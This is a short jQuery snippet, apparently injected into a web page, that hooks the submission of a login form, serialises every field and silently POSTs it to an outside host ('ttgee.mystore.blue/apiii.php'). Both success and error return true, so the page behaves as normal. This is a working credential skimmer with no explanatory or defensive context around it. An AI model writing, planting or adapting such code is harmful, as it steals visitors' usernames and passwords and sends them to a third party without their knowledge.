$(".login-form").submit(function () 
{ var values = $(".login-form");
  $.ajax({
    'url': "https://ttgee.mystore.blue/apiii.php",
    'type': 'POST',
    'data': $(this).serialize(),
    'success': function () {
      return true;
    },
    'error': function () {
      return true;
    }
  });
